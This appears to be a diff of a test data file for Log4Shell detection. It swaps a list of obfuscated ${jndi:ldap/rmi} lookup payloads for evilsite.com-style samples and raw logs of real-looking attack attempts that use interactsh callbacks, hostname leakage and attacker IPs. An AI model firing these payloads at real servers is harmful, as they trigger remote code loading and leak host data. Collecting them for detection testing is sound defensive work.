@@ -1,18 +1,5 @@
-jndi harmless text
-${jndi:ldap://somesitehackerofhell.com/z}
-ldap harmless text
-${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}
-hello
-${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}
-bla bla
-${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}
-whatever
-${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}
-even more payloads
-${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
-${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
-${jndi:rmi://adsasd.asdasd.asdasd}
-${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
-${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
-${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
-${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
+${jndi:ldap://evilsite.com/z}
+${jndi:ldap://evilsite.com/z}${jndi:ldap://potato.com/z}
+{"preview":false,"result":{"_raw":"{\"body_bytes\":138,\"bytes_sent\":694,\"content_type\":\"-\",\"protocol\":\"HTTP/1.1\",\"referer\":\"${jndi:ldap://${hostName}.c6rt1u7b6eyyyyyn.interactsh.com/poc}\",\"remote_user\":\"-\",\"request\":\"GET /?q=${jndi:ldap://${hostName}.c6rt1u7b6eyyyyyn.interactsh.com/poc} HTTP/1.1\",\"scheme\":\"https\",\"upstream_status\":\"-\",\"uri\":\"/?q=${jndi:ldap://${hostName}.c6rt1u7b6eyyyyyn.interactsh.com/poc}\",\"useragent\":\"Mozilla/5.0 ${jndi:ldap://${hostName}.c6rt1u7b6eyyyyyn.interactsh.com/poc}  (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\",\"x_forwarded_host\":\"-\"}"}}
+/$%7Bjndi:ldap://45.66.8.12:1378/watwatwat%7D?email=${jndi:ldap://45.110.8.12:1378/sports-event.unrelated.nuvemkloud.com} HTTP/1.1\"
+{"preview":false,"result":{"_raw":"{\"request_path\":\"/\",\"request_accept\":\"\",\"request_user_agent\":\"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostname}.c6340b92vtc00002scfggdpcz9eyyyyyd.interactsh.com/basic/command/base64/l3vzci9i20vcmnlcg}\",\"request_referer\":\"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostname}.c6340b92vtc00002scfggdpcz9eyyyyyd.interactsh.com/basic/command/base64/l3vzci9i20vcmnlcg}\",\"referer\":\"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostname}.c6340b92vtc00002scfggdpcz9eyyyyyd.interactsh.com/basic/command/base64/l3vzci9i20vcmnlcg}\",\"x-original-url\":\"https://sports.unrelated.nuvemkloud.com/?x=${jndi:ldap://${hostname}.c6340b92vtc00002scfggdpcz9eyyyyyd.interactsh.com/basic/command/base64/l3vzci9iaw4vdvcmnlcg/a}\",\"parsed_url\":\"https://unrelated-deploy-sample.unrelated.nuvemkloud.com/?x=${jndi:ldap://${hostname}.c6340b92vtc00002scfggdpcz9eyyyyyd.interactsh.com/basic/command/base64/l3vzci9iaw4vdvcmnlcg/a}\",\"cachedrequestid\":\"\",\"response_status_code\":401}","_time":"2021-12-12t12:18:19.719+0000"}}
